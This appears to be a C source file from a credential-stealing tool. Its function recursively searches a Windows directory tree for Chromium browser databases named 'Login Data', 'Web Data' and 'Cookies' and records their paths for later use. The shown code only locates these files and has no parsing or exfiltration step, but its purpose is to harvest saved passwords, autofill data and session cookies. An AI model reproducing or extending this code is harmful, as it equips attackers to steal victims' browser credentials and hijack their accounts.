#include <windows.h>
#include <shlwapi.h>
#include "Parsers.h"
#include "Vector.h"
#define FILE_ATTRIBUTES (FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM)

WCHAR* dupcat(PCWCHAR str) {
	WCHAR* mem = (WCHAR*)malloc(sizeof(WCHAR) * (lstrlenW(str) + 1));
	lstrcpyW((WCHAR*)mem, str);
	return mem;
}

void parseChromium(PCWCHAR startPath, vector* logindata, vector* webdata, vector* cookies)
{
	if (WCHAR *strDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR)))
	{
		WIN32_FIND_DATAW fd;
		wnsprintfW(strDir, MAX_PATH, L"%s\\*", startPath);
		HANDLE hIter = FindFirstFileW(strDir, &fd);
		if (hIter != INVALID_HANDLE_VALUE)
		{
			do
			{
				wnsprintfW(strDir, MAX_PATH, L"%s\\%s", startPath, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
				{
					parseChromium(strDir, logindata, webdata, cookies);
				}
				else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
				{
					if (0 == lstrcmpW(fd.cFileName, L"Login Data")) {
						vector_add(logindata, dupcat(strDir));
					}
					else if (0 == lstrcmpW(fd.cFileName, L"Web Data")) {
						vector_add(webdata, dupcat(strDir));
					}
					else if (0 == lstrcmpW(fd.cFileName, L"Cookies")) {
						vector_add(cookies, dupcat(strDir));
					}
				}
			} while (FindNextFileW(hIter, &fd));
			FindClose(hIter);
		}
		free(strDir);
	}
}